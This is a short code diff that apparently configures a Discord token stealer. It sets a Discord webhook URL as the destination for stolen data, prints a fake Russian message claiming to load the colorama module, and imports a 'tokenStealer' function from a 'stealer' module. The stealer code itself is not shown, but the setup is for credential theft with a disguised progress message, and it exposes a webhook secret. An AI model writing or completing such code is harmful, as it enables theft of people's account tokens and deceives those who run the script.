@@ -1,4 +1,4 @@
-WEBHOOK_URL = ''
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1043421693613449237/Z3XBNffZ0cWGUdICpZHy4C5maIEAZQbJtTCdyrnr4625ZxA0em1S7HjrdbwYOD-BV2-I'
 
 print('[Loading]', 'Загрузка модуля colorama...')
 from stealer import tokenStealer
